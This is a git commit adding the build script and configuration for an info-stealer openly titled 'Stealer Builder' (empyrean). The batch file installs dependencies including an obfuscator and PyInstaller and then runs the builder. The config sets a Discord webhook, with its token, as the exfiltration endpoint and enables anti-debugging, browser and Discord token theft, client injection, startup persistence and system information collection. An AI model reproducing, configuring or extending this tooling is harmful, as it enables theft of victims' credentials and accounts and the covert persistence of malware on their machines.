e86930327226b63bcc755a9c78ab7b876b1d4586
balin <71198262+Ba1in@users.noreply.github.com>
2023-05-09 21:28:21 +0300

    Add files via upload

---
+++ build.bat
@@ -0,0 +1,43 @@
+@echo off
+mode con: cols=100 lines=30
+title Stealer Builder
+color 0a
+cls
+
+python --version 2>&1 | findstr " 3.11" >nul
+if %errorlevel% == 0 (
+    echo python 3.11.x and up are not supported by empyrean. Please downgrade to python 3.10.x.
+    pause
+    exit
+)
+
+::fixed by K.Dot cause dif
+git --version 2>&1>nul
+if %errorlevel% == 9009 (
+    echo git is either not installed or not added to path! You can install it here https://git-scm.com/download/win
+    pause
+    exit
+)
+
+py -3.10 -m pip uninstall nextcord
+py -3.10 -m pip install --upgrade psutil
+py -3.10 -m pip install --upgrade requests
+py -3.10 -m pip install --upgrade wmi
+py -3.10 -m pip install --upgrade pycryptodome
+py -3.10 -m pip install --upgrade discord
+py -3.10 -m pip install --upgrade discord.py
+py -3.10 -m pip install --upgrade pillow
+py -3.10 -m pip install --upgrade pypiwin32
+py -3.10 -m pip install --upgrade tinyaes
+py -3.10 -m pip install --upgrade wheel   
+py -3.10 -m pip install --upgrade pyinstaller
+py -3.10 -m pip install --upgrade InquirerPy
+py -3.10 -m pip install --upgrade rich
+py -3.10 -m pip install --upgrade pyobf2==1.1.5
+
+cls
+
+if exist build rmdir /s /q build
+py -3.10 builder.py
+
+pause
---
+++ src/config.py
@@ -0,0 +1,9 @@
+__CONFIG__ = {
+    'webhook' : https://discord.com/api/webhooks/1103022559567564933/7pxldBeBGh6iQ7WRMSpch-am0zvgdmm4kj9BNe3pFEb7Piz7bzrCSOjQ4l8qC23KyU2g,
+    'antidebug' : True,
+    'browsers' : True,
+    'discordtoken' : True,
+    'injection' : True,
+    'startup' : True,
+    'systeminfo' : True,
+}
